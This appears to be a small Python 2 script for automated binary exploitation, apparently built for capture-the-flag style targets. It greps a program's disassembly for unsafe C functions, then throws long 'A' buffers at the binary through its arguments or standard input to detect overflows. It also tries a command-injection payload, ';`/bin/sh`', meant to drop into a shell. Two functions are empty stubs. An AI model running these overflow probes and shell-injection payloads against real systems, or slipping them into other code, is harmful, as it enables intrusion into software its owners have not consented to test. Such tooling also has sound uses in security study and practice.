#!/usr/bin/env python
#Idea is inspired by Connor
import sys
import os

def overflow_exploit1(length):	#When program uses argv[1] as input
	payload =  "A"*length
	a=os.system("echo " + payload + " > payload.txt && ./"+sys.argv[1]+ " $(cat payload.txt)")
	if a != 0:
		print "Exploitable1"

def overflow_exploit2(length): 	#When program uses scanf as input
	payload = "A"*length
	a=os.system("echo " + payload + " | ./"+sys.argv[1])
	if a != 0:
		print "Exploitable2"

def pull_trigger1(subs): 	### pull trigger if argv is input
	for sub in subs:
		sub = int(sub,16)
		print sub
		overflow_exploit1(sub)

def pull_trigger2(subs): 	### pull trigger if argv is input
	for sub in subs:
		sub = int(sub,16)
		print sub
		overflow_exploit2(sub)

def command_injection():
	payload = ";`/bin/sh`"
	os.system("echo " + payload + " > payload.txt && ./"+sys.argv[1]+ " $(cat payload.txt)")

def path_exploit():
	return 0

def binary_category():
	return 0

vuln_funs = filter(None,os.popen('objdump -d '+ sys.argv[1] +  ' | grep -oP "(strcpy|memcpy|scanf|printf|system|fgets|gets|execl)"').read().split('\n'))
vuln_funs = list(set(filter(None, vuln_funs)))
print "This program has these vulnerable functions:\n" + str(vuln_funs)


subs = subs = filter(None,os.popen('objdump -d ' +sys.argv[1]+ ' | grep -oP "(?<=sub    .)....(?=,%esp)"').read()).split('\n')
subs.sort()
subs = list(set(filter(None, subs)))


### pull trigger
for vuln_fun in vuln_funs:
	if vuln_fun == "scanf":
		pull_trigger2(subs)
		break
	elif vuln_fun == "execl":
		command_injection()
	else: ### assuming using argv as input
		pull_trigger1(subs)
		break


	

